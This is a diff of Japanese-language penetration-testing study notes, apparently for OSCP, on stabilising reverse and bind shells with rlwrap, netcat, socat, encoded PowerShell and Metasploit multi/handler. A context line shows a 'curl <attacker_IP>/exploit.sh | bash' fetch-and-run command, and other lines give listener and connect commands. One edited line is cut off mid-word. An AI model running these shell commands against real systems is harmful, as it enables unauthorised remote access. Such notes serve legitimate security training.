@@ -313,7 +313,7 @@ curl <attacker_IP>/exploit.sh | bash
 
 ## 🪟 Windowsターゲット向け安定化
 
-Windowsでは安定化する手法が限られており、最も効果的な手法は[[#OS共通：rlwrapを使ってリスナーを立てる]]方法くらい。
+Windowsでは安定化する手法が限られており、効果的な手法は[[#OS共通：rlwrapを使ってリスナーを立てる]]か、[[#Metasploit - multi/handler]]を使う
 
 その他、PowerShellのエンコーディングの問題や文字化け解消に使えるテクニック
 ```powershell
@@ -331,7 +331,6 @@ chcp 65001
 - ✅標準インストールされていることが多い
 - ✅カスタマイズ性高
 - ✅列挙中にバナー情報収集するためなど、あらゆるネットワークへのインタラクションを手動で実行する
-	- バナーチェック (banner grabbing)とは、コンピュータに外部から侵入可能な脆弱性がないか調べる手法の一つ
 
 ```zsh
 # Bind Shell
@@ -360,7 +359,6 @@ nc -nv <target_IP> <port>
 - ✅完全にインタラクティブとなり、SSHのような対話形式のパスワード入力も可能になる
 
 1. リスナーの用意
-	- netcat シェルで `Ctrl + Z`, `stty raw -echo; fg` を使うのとほぼ同じ機能
 ```zsh
 socat TCP-L:<Port> FILE:`tty`,raw,echo=0
 ```
@@ -459,11 +457,11 @@ powershell -enc '<Base64エンコードされたペイロード>'
 
 ## Metasploit - multi/handler
 
-- Windowsにおいても安定している
+- ✅️Windowsにおいても安定している
 - Meterpreterシェルを使用したい場合は必須で、ステージングされたペイロードを使用する場合は、このツールを使用する
 - Metasploitフレームワークの`exploit/multi/handler`モジュールはsocat や netcat のように、リバースシェルを受信するために使用されるリスナー（OSCPで利用可能）
 	- Meterpreterシェルは、Metasploit独自の完全な機能を備えたシェル
-	- ✅非常に安定しているため、Windowsのターゲットで作業する際には非常に有効な手段
+	- ✅非常に安
 	- ✅ファイルのアップロードやダウンロードなど、多くの機能を内蔵している
 	- ❌必ずMetaSploitモジュールから通信が必要である（msfvenomの実行結果の通信など）
 
